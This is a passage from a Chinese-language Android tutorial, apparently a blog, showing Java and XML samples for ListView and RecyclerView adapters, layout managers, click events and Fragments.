viewHolder.fruitName.setText(fruit.getName());</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ViewHolder</span> &#123;</span><br><span class="line"></span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ListView点击事件</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits(); <span class="comment">// 初始化水果数据</span></span><br><span class="line">        <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(MainActivity.<span class="built_in">this</span>, R.layout.fruit_item, fruitList);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listView</span> <span class="operator">=</span> (ListView) findViewById(R.id.list_view);</span><br><span class="line">        listView.setAdapter(adapter);</span><br><span class="line">        listView.setOnItemClickListener(<span class="keyword">new</span> <span class="title class_">AdapterView</span>.OnItemClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view,</span></span><br><span class="line"><span class="params">                                    <span class="type">int</span> position, <span class="type">long</span> id)</span> &#123;</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitList.get(position);</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="RecyclerView">RecyclerView</h3><p>一个增强版的ListView，可以实现和ListView同样的效果，还优化ListView中的不足。</p><p>实现和上面ListView同样功能</p><p>activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;androidx.recyclerview.widget.RecyclerView</span><br><span class="line">     android:<span class="attribute">id</span>=<span class="string">&quot;@+id/recycler_view&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>Fruit和fruit_item.xml同上</p><p>FruitAdapter修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.Adapter&lt;FruitAdapter.ViewHolder&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; mFruitList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(List&lt;Fruit&gt; fruitList)</span>&#123;</span><br><span class="line">        mFruitList=fruitList; <span class="comment">//传递数据源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;  <span class="comment">//itemView 子项最外层布局</span></span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBindViewHolder</span><span class="params">(FruitAdapter.ViewHolder holder, <span class="type">int</span> position)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">        holder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        holder.fruitName.setText(fruit.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getItemCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mFruitList.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>onCreateViewHolder()：创建ViewHolder实例，把加载出来的布局传入到构造函数中，最后将ViewHolder实例返回</p><p>onBindViewHolder()：对RecyclerView子项的数据进行赋值，会在每个子项滚到屏幕内执行，通过position获得Fruit实例，再设置数据。</p><p>getItemCount()：数据源长度</p><p>MainActivity如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();<span class="comment">//初始化数据</span></span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>layoutManager：指定RecyclerView布局方式，这里使用LinearLayoutManager是线性布局的意思</p><h4 id="实现横向滚动和瀑布流布局">实现横向滚动和瀑布流布局</h4><p><strong>横线滚动</strong></p><p>修改fruit_item</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;100dp&quot;</span>  //<span class="attr">为了避免名字长短不一</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        </span><br><span class="line">        layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</span><br><span class="line">        </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager)；</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上面RecyclerView基本使用相比，多了<code>layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</code></p><p>这个方法用来设置布局排列方向，默认是纵向的，传入LinearLayoutManager.HORIZONTAL表示布局横向排列，就可以横向滚动了。</p><p>除了LinearLayoutManager，RecyclerView还提供<code>GridLayoutManager</code>和<code>StaggeredGridLayoutManager</code></p><p>GridLayoutManager：实现网络布局</p><p>StaggeredGridLayoutManager：实现瀑布流布局</p><p><strong>对于瀑布流实现做如下修改</strong></p><p><strong>fruit_item.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>   //<span class="attr">瀑布布局宽度由列数决定</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_margin</span>=<span class="string">&quot;5dp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上面例子中做如下修改</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">    </span><br><span class="line">        <span class="type">StaggeredGridLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StaggeredGridLayoutManager</span>(<span class="number">3</span>, StaggeredGridLayoutManager.VERTICAL);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//StaggeredGridLayoutManager </span></span><br><span class="line"><span class="comment">//第一个参数为列数，第二个参数是排列方向</span></span><br></pre></td></tr></table></figure><h4 id="RecyclerView点击事件">RecyclerView点击事件</h4><p>RecyclerView没有提供类似ListView的点击事件接口，ListView点击事件是针对子项的，对于子项的一个控件的点击事件需要另外实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对基本的RecyclerView操作的FruitAdapter进行如下添加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        View fruitView;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitView=itemView;</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        holder.fruitView.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span class="string">&quot;You click view&quot;</span>+fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        holder.fruitImage.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span class="string">&quot;You click image&quot;</span>+fruit.getImageId(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="碎片-Fragment">碎片(Fragment)</h3><p>碎片：一种可以嵌入在活动当中的UI片段，能让程序更加合理充分的利用大屏幕空间。可以类比为一个迷你型的活动，虽然可能和活动一样大</p><h4 id="碎片基本使用"><strong>碎片基本使用</strong></h4><p>left_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>right_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>LeftFragment类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LeftFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.left_fragment,container,<span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RightFragment同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="动态加载碎片">动态加载碎片</h4><p>新建一个another_activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is another right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>新建一个类AnotherRightFragment</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnotherRightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> 